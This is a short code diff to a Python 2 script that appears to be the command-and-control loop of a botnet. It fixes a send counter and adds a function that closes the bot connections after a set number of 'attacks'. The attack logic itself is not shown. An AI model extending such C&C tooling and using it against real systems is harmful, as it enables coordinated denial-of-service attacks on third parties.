@@ -39,17 +39,28 @@ def attack():
 
     updateinterval()
 
+def closeConnections():
+    for bot in bots:
+        try:
+            bot.close()
+        except:
+            print "unable to close"
+
 def runner():
     print("waiting 1min before sending attacks");
     time.sleep(60)
     count = 0
     while True:
-        if count == total_send-1:
+        if count == total_send:
             print("[cnc] total send reached")
             break
         attack()
-        print("[cnc] attacks sent")
+        count = count + 1
+        print("[cnc] attacks sent "+str(count))
         time.sleep(attack_interval)
+
+    # if we are here means that total send has completed
+    closeConnections()
 
 try:
     thread.start_new_thread(runner,())
